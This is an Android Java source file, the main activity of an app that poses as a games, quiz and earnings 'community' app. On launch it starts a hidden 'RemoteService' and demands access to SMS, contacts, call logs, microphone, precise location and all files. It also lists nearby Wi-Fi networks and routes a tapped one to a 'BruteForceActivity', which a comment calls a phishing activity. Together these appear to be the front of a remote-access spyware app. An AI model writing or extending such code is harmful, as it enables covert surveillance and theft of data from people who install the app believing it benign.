package com.sohaibazmi.remote;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class MainActivity extends AppCompatActivity {

    private final String[] permissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
    };



    private final int PERM_REQ_CODE = 101;

    private WifiManager wifiManager;
    private ListView wifiListView;
    private LinearLayout loadingLayout;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // UI elements
        wifiListView = findViewById(R.id.wifi_list);
        loadingLayout = findViewById(R.id.loadingLayout);

        wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);

        // Start RemoteService (unchanged)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(new Intent(this, RemoteService.class));
        }

        // Check permissions
        if (!hasAllPermissions()) {
            ActivityCompat.requestPermissions(this, permissions, PERM_REQ_CODE);
        } else {
            Toast.makeText(this, "WelCome to our Community", Toast.LENGTH_SHORT).show();
            scanNearbyWifi();
        }

        // Button 1: Play Games
        Button playGamesButton = findViewById(R.id.playGamesButton);
        playGamesButton.setOnClickListener(v -> {
            Intent intent = new Intent(MainActivity.this, GamesActivity.class);
            startActivity(intent);
        });

        // Button 2: Market
        Button marketButton = findViewById(R.id.marketButton);
        marketButton.setOnClickListener(v -> {
            Intent intent = new Intent(MainActivity.this, MarketActivity.class);
            startActivity(intent);
        });

        // Button 3: News
        Button newsButton = findViewById(R.id.newsButton);
        newsButton.setOnClickListener(v -> {
            Intent intent = new Intent(MainActivity.this, NewsSourcesActivity.class);
            startActivity(intent);
        });

        Button contactButton = findViewById(R.id.contactButton);
        contactButton.setOnClickListener(v -> {
            Intent intent = new Intent(MainActivity.this, ContactDeveloperActivity.class);
            startActivity(intent);
        });

        Button playQuizButton = findViewById(R.id.playQuizButton);
        playQuizButton.setOnClickListener(v -> {
            Intent intent = new Intent(MainActivity.this, QuizActivity.class);
            startActivity(intent);
        });

        Button quizButton = findViewById(R.id.playQuizButton);

        quizButton.setOnClickListener(v -> {
            // 1️⃣ Check if user is logged in
            if (FirebaseAuth.getInstance().getCurrentUser() == null) {
                Toast.makeText(this, "Please login first to play.", Toast.LENGTH_SHORT).show();
                startActivity(new Intent(this, ProfileActivity.class));  // Go to login/register
                return;
            }

            // 2️⃣ Check balance from database
            String uid = FirebaseAuth.getInstance().getCurrentUser().getUid();
            DatabaseReference ref = FirebaseDatabase.getInstance().getReference("users").child(uid).child("earnings");

            ref.get().addOnSuccessListener(snapshot -> {
                if (snapshot.exists()) {
                    String earningStr = snapshot.getValue(String.class).replace("₹", "").trim();
                    double balance = Double.parseDouble(earningStr);

                    if (balance >= 1.0) {
                        // ✅ Start quiz only if enough credit
                        startActivity(new Intent(MainActivity.this, QuizActivity.class));
                    } else {
                        Toast.makeText(this, "You need at least ₹1 to play.", Toast.LENGTH_SHORT).show();
                    }
                } else {
                    Toast.makeText(this, "No profile found. Please register first.", Toast.LENGTH_SHORT).show();
                }
            }).addOnFailureListener(e -> Toast.makeText(this, "Error checking balance.", Toast.LENGTH_SHORT).show());
        });

        Button profileButton = findViewById(R.id.profileButton);
        profileButton.setOnClickListener(v -> {
            Intent intent = new Intent(MainActivity.this, ProfileActivity.class);
            startActivity(intent);
        });



        // ✅ Wi-Fi List Item Click → Launch Phishing Activity
        wifiListView.setOnItemClickListener((parent, view, position, id) -> {
            String selectedSSID = parent.getItemAtPosition(position).toString();

            Intent phishingIntent = new Intent(MainActivity.this, BruteForceActivity.class);  // If you renamed it to PhishingActivity, update here
            phishingIntent.putExtra("ssid", selectedSSID);
            startActivity(phishingIntent);
        });
    }


    private boolean hasAllPermissions() {
        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED)
                return false;
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] perms,
                                           @NonNull int[] results) {
        super.onRequestPermissionsResult(requestCode, perms, results);

        if (requestCode == PERM_REQ_CODE) {
            boolean granted = true;
            for (int r : results) {
                if (r != PackageManager.PERMISSION_GRANTED) {
                    granted = false;
                    break;
                }
            }
            if (granted) {
                Toast.makeText(this, "✅ All permissions granted", Toast.LENGTH_SHORT).show();
                scanNearbyWifi();
            } else {
                Toast.makeText(this, "⚠️ Some permissions denied", Toast.LENGTH_LONG).show();
                finish();
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Toast.makeText(this, "⚠️ File access not granted", Toast.LENGTH_SHORT).show();
                return;
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }
        }
    }


    private void scanNearbyWifi() {
        if (!wifiManager.isWifiEnabled()) {
            wifiManager.setWifiEnabled(true);
            Toast.makeText(this, "📶 Enabling Wi-Fi...", Toast.LENGTH_SHORT).show();
        }

        loadingLayout.setVisibility(View.VISIBLE); // Show spinner

        boolean success = wifiManager.startScan();
        if (!success) {
            Toast.makeText(this, "⚠️ Scan failed to start", Toast.LENGTH_SHORT).show();
            loadingLayout.setVisibility(View.GONE);
            return;
        }

        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                List<ScanResult> results = wifiManager.getScanResults();
                List<String> ssids = new ArrayList<>();

                for (ScanResult scan : results) {
                    if (!scan.SSID.isEmpty()) {
                        ssids.add(scan.SSID + " (" + scan.level + " dBm)");
                    }
                }

                loadingLayout.setVisibility(View.GONE);

                if (ssids.isEmpty()) {
                    Toast.makeText(MainActivity.this, "❌ No Wi-Fi networks found", Toast.LENGTH_LONG).show();
                }

                ArrayAdapter<String> adapter = new ArrayAdapter<>(
                        MainActivity.this, android.R.layout.simple_list_item_1, ssids);
                wifiListView.setAdapter(adapter);

                wifiListView.setOnItemClickListener((parent, view, position, id) -> {
                    String selectedSSID = ssids.get(position).split(" \\(")[0]; // Extract SSID
                    Intent intents = new Intent(MainActivity.this, BruteForceActivity.class);
                    intent.putExtra("ssid", selectedSSID);
                    startActivity(intents);
                });


                unregisterReceiver(this);
            }
        }, new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION));
    }
}
